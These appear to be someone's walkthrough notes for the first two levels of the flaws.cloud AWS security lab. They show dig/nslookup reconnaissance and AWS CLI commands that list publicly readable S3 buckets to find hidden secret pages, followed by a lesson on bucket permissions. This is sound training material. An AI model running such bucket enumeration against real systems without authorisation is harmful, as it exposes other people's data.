

[toc]

---


# Flaw1

---

![Screen Shot 2021-01-21 at 00.03.38](https://i.imgur.com/cVGDgzA.png)

---


## Level 1 - list S3 from outside

> http://flaws.cloud/

<font color=red> This level is *buckets* of fun. See if you can find the first sub-domain </font>


- The site flaws.cloud is hosted as an S3 bucket.
  - a great way to host a static site
  - When hosting a site as an S3 bucket, the bucket name (flaws.cloud) must match the domain name (flaws.cloud).
  - S3 buckets are a global name space

> so could create a bucket named `apple.com`
> and Apple would never be able host their main site via S3 hosting.

1. determine the site is hosted as an S3 bucket by running a DNS lookup on the domain

    ```bash
    $ dig flaws.cloud
    # ; <<>> DiG 9.10.6 <<>> flaws.cloud
    # ...
    # ;; ANSWER SECTION:
    # flaws.cloud.		5	IN	A	52.218.201.235
    ```

2. Visiting `54.231.184.255`, it's `https://aws.amazon.com/s3/`
   - flaws.cloud is hosted as an S3 bucket.


3. find region
   - nslookup
   - cyberduck: browse this bucket and it will figure out the region automatically.
   - it's hosted in the region us-west-2

    ```bash
    nslookup 54.231.184.255
    # Non-authoritative answer:
    # 255.184.231.54.in-addr.arpa     name = s3-website-us-west-2.amazonaws.com
    ```


4. its permissions are a little loose.
   - bucket named `flaws.cloud` in `us-west-2`
   1. go to the link `http://flaws.cloud.s3.amazonaws.com/`
   2. browse the bucket by aws cli

        ```bash
        $ aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
        # 2017-03-13 23:00:38       2575 hint1.html
        # 2017-03-02 23:05:17       1707 hint2.html
        # 2017-03-02 23:05:11       1101 hint3.html
        # 2020-05-22 14:16:45       3162 index.html
        # 2018-07-10 12:47:16      15979 logo.png
        # 2017-02-26 20:59:28         46 robots.txt
        # 2017-02-26 20:59:30       1051 secret-dd02c7c.html
        ```

5. go to the link `http://flaws.cloud.s3.amazonaws.com/secret-dd02c7c.html`
   - ![Screen Shot 2021-01-21 at 00.22.58](https://i.imgur.com/YEbY6tV.png)


### Lesson learned

set up S3 buckets with permissions
- shouldn't allow bucket listings.
  - Directory listing of S3 bucket of Legal Robot (link) and Shopify (link).
  - list the files simply by going to `http://flaws.cloud.s3.amazonaws.com/`
- Read and write permissions to S3 bucket for Shopify again (link) and Udemy (link).

![everyone](https://i.imgur.com/WPhVptq.png)



---



## Level 2 - List S3 from AWS inside

> http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud

<font color=red> The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier </font>




aws s3 --profile YOUR_ACCOUNT ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud


```bash
$ aws s3 ls s3://flevel2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
# An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist

$ aws s3 --profile default ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
# 2017-02-26 21:02:15      80751 everyone.png
# 2017-03-02 22:47:17       1433 hint1.html
# 2017-02-26 21:04:39       1035 hint2.html
# 2017-02-26 21:02:14       2786 index.html
# 2017-02-26 21:02:14         26 robots.txt
# 2017-02-26 21:02:15       1051 secret-e4443fc.html

$ curl https://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud.s3.amazonaws.com/secret-e4443fc.html
# curl: (60) SSL: no alternative certificate subject name matches target host name 'level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud.s3.amazonaws.com'


# go to http://flaws.cloud.s3.amazonaws.com/secret-dd02c7c.html
```




![Screen Shot 2021-01-21 at 00.40.34](https://i.imgur.com/RlfNUn0.png)



.
